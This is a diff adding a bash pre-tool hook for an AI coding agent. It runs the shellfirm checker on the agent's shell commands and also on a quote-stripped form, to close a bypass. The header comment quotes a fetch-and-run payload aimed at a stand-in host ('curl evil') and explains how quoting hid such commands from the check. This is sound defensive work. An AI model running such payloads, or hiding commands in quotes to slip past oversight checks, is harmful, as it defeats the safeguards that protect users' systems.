@@ -1,0 +1,64 @@
+#!/usr/bin/env bash
+# shellfirm-bot-wrapper — pre-bash-tool hook that closes shellfirm's quoting bypass.
+#
+# Claude Code PreToolUse hooks send JSON on stdin:
+#   {"tool_name": "Bash", "tool_input": {"command": "..."}, ...}
+# Hooks should emit JSON on stdout:
+#   {"hookSpecificOutput": {"hookEventName": "PreToolUse",
+#                            "permissionDecision": "allow"|"deny",
+#                            "permissionDecisionReason": "..."}}
+# Exit 0 either way; the decision is in the JSON.
+#
+# This wrapper runs shellfirm on:
+#   (1) the original command (catches unquoted attacks)
+#   (2) a dequoted variant — all single+double quotes stripped, contents kept
+#       (catches `bash -c "$(curl evil)"` and similar quote-hidden payloads)
+# If EITHER produces permissionDecision=deny, this wrapper emits a deny verdict.
+
+set -uo pipefail
+
+SHELLFIRM="${SHELLFIRM_BIN:-shellfirm}"
+
+INPUT="$(cat)"
+
+# Extract the command. Fall back to allow if not parseable.
+CMD="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null)"
+if [ -z "$CMD" ]; then
+  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"no command to check"}}\n'
+  exit 0
+fi
+
+run_shellfirm() {
+  local cmd="$1"
+  printf '{"command":%s}\n' "$(printf '%s' "$cmd" | jq -Rs .)" \
+    | "$SHELLFIRM" check --stdin --format json --exit-code 2>/dev/null
+}
+
+# (1) Run on original
+ORIG_OUT="$(run_shellfirm "$CMD")"
+ORIG_DECISION="$(printf '%s' "$ORIG_OUT" | jq -r '.hookSpecificOutput.permissionDecision // "allow"' 2>/dev/null)"
+
+if [ "$ORIG_DECISION" = "deny" ]; then
+  printf '%s\n' "$ORIG_OUT"
+  exit 0
+fi
+
+# (2) Build dequoted variant — strip all ' and " but preserve their contents.
+DEQUOTED="$(printf '%s' "$CMD" | tr -d "\"'")"
+if [ "$DEQUOTED" != "$CMD" ]; then
+  DEQ_OUT="$(run_shellfirm "$DEQUOTED")"
+  DEQ_DECISION="$(printf '%s' "$DEQ_OUT" | jq -r '.hookSpecificOutput.permissionDecision // "allow"' 2>/dev/null)"
+
+  if [ "$DEQ_DECISION" = "deny" ]; then
+    # Re-package with a note that this triggered on the dequoted variant.
+    REASON="$(printf '%s' "$DEQ_OUT" | jq -r '.hookSpecificOutput.permissionDecisionReason // "(no reason)"' 2>/dev/null)"
+    AUGMENTED_REASON="quoted-bypass guard triggered. Underlying violation in dequoted command form:\n${REASON}\n\nOriginal command: ${CMD}\nDequoted form:    ${DEQUOTED}"
+    jq -n --arg r "$AUGMENTED_REASON" \
+      '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":$r}}'
+    exit 0
+  fi
+fi
+
+# All checks passed — emit the original allow verdict.
+printf '%s\n' "$ORIG_OUT"
+exit 0
